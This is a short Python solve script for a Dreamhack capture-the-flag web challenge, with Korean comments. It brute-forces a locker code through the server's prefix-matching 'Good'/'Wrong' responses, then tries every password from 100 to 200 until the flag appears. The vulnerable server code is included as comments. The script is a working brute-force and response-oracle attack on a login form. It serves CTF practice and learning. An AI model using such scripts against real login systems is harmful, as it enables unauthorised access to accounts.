import requests
import string

locker = ""
password = ""
tmp = ""

data = {"locker_num" : tmp , "password" : password}
URL = "http://host3.dreamhack.games:23411/"

res = requests.post(URL, data=data)

print(res.text)
chr = string.ascii_lowercase + string.digits



#1. locker num 찾기
for i in range(4) :
    break
    for j in chr :
        print("j :",j)
        tmp = locker
        tmp += j
        print(tmp)
        res = requests.post(URL, data={"locker_num":tmp, "password":password})
        if "Good" in res.text:
            locker += j
            print("locker :",locker)
            break
        elif "Wrong" in res.text :
    	    print("wrong..")
locker = "g822"

print("locker :", locker)

# 2. password 찾기
for i in range(100,201) :
    print(str(i))
    res = requests.post(URL, data={"locker_num": locker, "password":str(i)})
    if "FLAG:" in res.text :
        print("성공")
        print(res.text)
        break
    

# rand_str = ""
# alphanumeric = string.ascii_lowercase + string.digits
# for i in range(4):
#     rand_str += str(random.choice(alphanumeric))

# rand_num = random.randint(100, 200)


# @app.route("/", methods = ["GET", "POST"])
# def index():
#     if request.method == "GET":
#         return render_template("index.html")
#     else:
#         locker_num = request.form.get("locker_num", "")
#         password = request.form.get("password", "")
#         if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
#             if locker_num == rand_str and password == str(rand_num):
#                 return render_template("index.html", result = "FLAG:" + FLAG)
#             return render_template("index.html", result = "Good")
#         else: 
#             return render_template("index.html", result = "Wrong!")